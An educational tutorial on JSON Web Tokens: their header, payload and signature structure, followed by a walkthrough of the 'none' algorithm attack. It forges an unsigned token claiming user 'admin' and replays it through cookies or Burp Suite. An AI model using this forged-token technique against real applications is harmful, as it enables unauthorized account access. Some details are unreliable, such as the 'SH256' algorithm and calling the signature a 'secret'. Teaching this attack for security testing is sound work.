# **Learning from the Field: Web Exploitation**

## **JWT**

JSON Web Token (JWT) is an Internet standard for creating data with optional signature and optional encryption. JWTs can be signed using a secret (with the HMAC algorithm) or a **public/private** key pair using **RSA** or **ECDSA**.

### **Usage of JWTs**

A very common use of a JWT token is as an API **authentication mechanism**. as well as **Information Exchange**.

#### **Authorization**

Once the user is logged in, the user can access everything allowed with that token.

#### **Information Exchange**

JWTs are useful in sharing information because they are signed by public/private keys as well as we can verify the token if it's tampered or not.

### **JSON Web Token structure**

JWTs cosists of 3 parts seperated by dots.

header.payload.signature

#### **Header**

Header consist of 2 things first one is **type of token** and another thing is **signing algorithm** like HMAC SHA256 or RSA.

For Example:

`Base64:    eyJhbGciOiAiU0gyNTYiLAogICJ0eXAiOiAiSldUIn0=`

After Decoding:

``` 
{
  "alg": "SH256",
  "typ": "JWT"
} 
```

#### **Payload**

Payload contains the claims. Claims are statements about the user and additional data about the user.

For Example:

`Base64: eyJpZCI6ICIxIiwKICAibmFtZSI6ICJBbmFzIEphbWFsIiwKICAiYWRtaW4iOiB0cnVlfQ==`

After Decoding:
```

{
    "id": "1",
  "name": "Anas Jamal",
  "admin": true
} 

```

#### Signature

For creating the signature part you have to take the base64 encoded header and payload, a secret, the algorithm specified in the header, and sign that.

For Example:

```

HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret
  )
  ```

#### **All 3 Combined**

`Header + Payload + Secret`


```
eyJhbGciOiAiU0gyNTYiLAogICJ0eXAiOiAiSldUIn0.eyJpZCI6ICIxIiwKICAibmFtZSI6ICJBbmFzIEphbWFsIiwKICAiYWRtaW4iOiB0cnVlfQ.6pqwrq5XQFq3453rtw234fuZ4
```

### **Awesome, Now let's learn How To Hack Them**

Whenever you will recieve a jwt token first decode it and break it into parts like we have learnt in the above section.

`Header + Payload + Secret`

For decoding you can use:

1. Terminal  
2. [jwt.io](https://jwt.io/). 
3. Decoder tab in burp Suite

There are other ways for decoding the token too.

#### **Terminal**

Linux:

```
echo "eyJhbGciOiAiU0gyNTYiLAogICJ0eXAiOiAiSldUIn0" | base64 -d 
```

Mac OS:

```
echo "eyJhbGciOiAiU0gyNTYiLAogICJ0eXAiOiAiSldUIn0" | base64 -D 
```

Note: Keep in mind in mac os we use "D" instead of  "d".

#### **jwt.io**

just copy the whole token and paste it into `Encoded` Section and you will get decoded token in `Decoded` Section.

#### **Burp Suite Decoder**

Copy the whole token and go to burp suite `Decoder` tab and paste it there and select first part and click on `decode` as `base64` and do the same thing with other parts of the token.

**Note** : Don't include dot(`.`) while decoding the token.

#### **None Algorithm**

`None` Algorithm is used when the integrity of the token has been already verified but hackers can use this algorithm and can tamper the token and can gain unauthorized access. 
Let's See How

```
Token : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCJ9.6pqwrq5XQFq3453rtw234fuZ4
```

**JWT Token Break Down**:

1. eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 (Header)
2. eyJ1c2VyIjoidGVzdCJ9 (Payload)
3. 6pqwrq5XQFq3453rtw234fuZ4 (Secret)

After Decoding:

Header:
```
{
    "alg":"HS256",
    "typ":"JWT"
}
```

Payload:
```
{
    "user":"test"
}
```
Now let's change "alg" from `HS256` to `None` and "user" from `test` to `admin`

Header After Changes:

```
{
    "alg":"None",
    "typ":"JWT"
}
```

Payload After Changes:
```
{
    "user":"admin"
}
```

Now base64 encode `Header` and `Payload` and send the new token to the web application with empty `secret`.

New Token:

```
eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

For encoding we can use :

1. CyberChef

2. Burp Suite Decoder

3. Your Terminal

For encoding on Terminal just remove `-d` / `-D` let's see an example

```
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64
```

Very Simple right?

For sending Requests we can use:

1. Inspect Element > Go to cookies > replace the token with your new token.

2. Burp Suite Intercept or send the requests to repeater and play with the request.

So this is one simple way of hacking JWTs.